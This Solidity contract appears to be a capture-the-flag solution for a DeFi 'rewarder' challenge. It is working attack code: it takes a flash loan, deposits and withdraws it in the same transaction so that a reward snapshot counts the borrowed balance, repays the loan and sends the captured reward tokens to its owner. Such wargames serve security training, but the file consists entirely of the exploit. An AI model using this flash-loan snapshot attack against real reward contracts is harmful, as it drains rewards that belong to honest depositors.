// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256) external;
}

interface IFlashLoanPool {
    function flashLoan(uint256) external;
    function liquidityToken() external view returns(address);
}

interface IRewarderPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function rewardToken() external view returns(address);
}

contract TheRewarderAttacker is IFlashLoanReceiver {
    IFlashLoanPool private immutable flashLoanPool;
    IRewarderPool private immutable theRewarderPool;
    address private immutable owner;
    constructor(address _flPool, address _rewarderPool ) payable {
        flashLoanPool = IFlashLoanPool(_flPool);
        theRewarderPool = IRewarderPool(_rewarderPool);
        owner = msg.sender;
    }

    function attack(uint256 _amount) external {
        require(msg.sender == owner, "only owner");

        flashLoanPool.flashLoan(_amount);

        // send reward token to owner
        IERC20 rewardToken = IERC20(theRewarderPool.rewardToken());
        uint256 thisBalance = rewardToken.balanceOf(address(this));
        bool bRes = rewardToken.transfer(owner, thisBalance);
        require(bRes, "reward token transfer failed");
    }


    function receiveFlashLoan(uint256 amount) override external {
        require(msg.sender == address(flashLoanPool), "only pool");

        IERC20 dvt = IERC20(flashLoanPool.liquidityToken());
        bool bRes = dvt.approve(address(theRewarderPool), amount);
        require(bRes, "approve rewarderPool failed");

        // deposit and withdraw will leave balance on snapshot
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);

        // pay back dvt
        bRes = dvt.transfer(address(flashLoanPool), amount);
        require(bRes, "pay back dvt failed");
    }
}
